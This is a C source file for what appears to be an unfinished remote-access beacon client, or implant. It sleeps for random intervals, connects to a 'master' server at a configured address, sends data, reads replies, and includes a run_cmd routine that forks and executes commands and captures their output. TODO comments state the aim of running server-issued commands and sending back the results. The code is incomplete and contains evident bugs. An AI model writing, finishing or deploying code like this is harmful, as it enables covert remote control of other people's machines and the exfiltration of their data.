#include <stdlib.h>
#include <stdio.h>
#include "beacon_client.h"

int main(int argc, char **argv){
    struct sockaddr_in master;
    while ( 1 ) {
        int sleep_time = (rand() % 3600) + 300;
        #ifdef CLIENT_DEBUG
            printf("Sleeping for %d seconds... ",sleep_time);
        #endif

        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
            sleep(sleep_time); //seconds
        #elif __windows__
            Sleep(sleep_time*1000); //seconds -> milliseconds
        #endif

        #ifdef CLIENT_DEBUG
            printf("Complete.\n");
        #endif

        // TODO Finish:
        // check-in to server & send back previous command results
        // if command
            // run command
            // save results to be sent back on next beacon

    }
    return 0;
}

/*
 * Initalize connection
 */
int master_init(struct sockaddr_in master) {

    #if defined __apple__ || defined(__linux__) || defined(__unix__)
        memset(&master, 0, sizeof(master));
        master.sin_family = AF_INET;
        master.sin_addr.s_addr = inet_addr( MASTER_IP );
        master.sin_port = MASTER_PORT;
    #elif __windows__

    #endif
    return 0;
}

int master_checkin(struct sockaddr_in master, char *data){

    #if defined __apple__ || defined(__linux__) || defined(__unix__)
        // do standard sockets
        int s;
        if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
            #ifdef CLIENT_DEBUG
                printf("[master_checkin] Socket creation failed.");
            #endif
            return -1;
        }
        // Establish connection
        if (connect(s, (struct sockaddr *) &master, sizeof(master)) < 0) {
            #ifdef CLIENT_DEBUG
                printf("[master_checkin] Connect to master failed.");
            #endif
            return -1;
        }
    #elif __windows__
        WSADATA wsa;
        SOCKET s;

        #ifdef CLIENT_DEBUG
            printf("[master_checkin] Initialising...");
        #endif
        if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
        {
            #ifdef CLIENT_DEBUG
                printf("Failed. Error: %d",WSAGetLastError());
            #endif
            return -1; //windows being windows
        }

        //Create a socket
        if((s = socket( AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
        {
            #ifdef CLIENT_DEBUG
                printf("Could not create socket : %d" , WSAGetLastError());
            #endif
            return -1; //failed to make socket... die
        }

        // Connection settings
        master.sin_addr.s_addr = inet_addr( MASTER_IP );
        master.sin_family = AF_INET;
        master.sin_port = htons( MASTER_PORT );

        // Connect to master
        if (connect(s , (struct sockaddr *)&master , sizeof(master)) < 0)
        {
            return -1; //couldn't connect... shit.
        }

        // Send data
        if( send(s , data , strlen(data) , 0) < 0)
        {
            return -1; //something failed :(
        }
        //Receive a reply from the server
        if((recv_size = recv(s , server_reply , 2000 , 0)) == SOCKET_ERROR)
        {
            puts("recv failed");
        }

        puts("Reply received\n");

        //Add a NULL terminating character to make it a proper string before printing
        server_reply[recv_size] = '\0';
        puts(server_reply);
    #endif
    return 0;
}

char *get_os() {
    return run_cmd(ID_CMD,NULL);
}

char *run_cmd(char *cmd,char **param) {
    int pipes[2];
    pid_t pid;
    char *buf = (char *)malloc(sizeof(char) * BUF_SIZE);
    if (pipe(pipes)==-1) {
        #ifdef CLIENT_DEBUG
            puts("[run_cmd] Failed to pipe.\n");
        #endif
        return NULL; // fail
    }
    if ((pid = fork()) == -1) {
        #ifdef CLIENT_DEBUG
            puts("[run_cmd] Failed to fork.\n");
        #endif
        return NULL; // fail
    }

    if(pid == 0) {
        // TODO: FIX from direct exec to
        // pipe->dup2->exec shell->write to stdin->send \n to stdin->read stdout save results->return results
        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
            dup2(pipes[1], STDOUT_FILENO);
        #elif __windows__
            _dup2(pipes[1], STDOUT_FILENO);
        #endif
        close(pipes[0]);
        close(pipes[1]);
        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
            if (param) {
                execv(cmd,param);
            } else {
                execl(cmd,"");
            }
        #elif __windows__
            _execv(cmd,param);
        #endif
    } else {
        close(pipes[1]);
        int nbytes = read(pipes[0], buf, BUF_SIZE);
        #ifdef CLIENT_DEBUG
            printf("[run_cmd] CMD ran: %s, Params[0]: %s, Output (%d bytes): %s\n", cmd, param[0], nbytes, buf);
        #endif
        wait(NULL);
    }
    return buf;
}
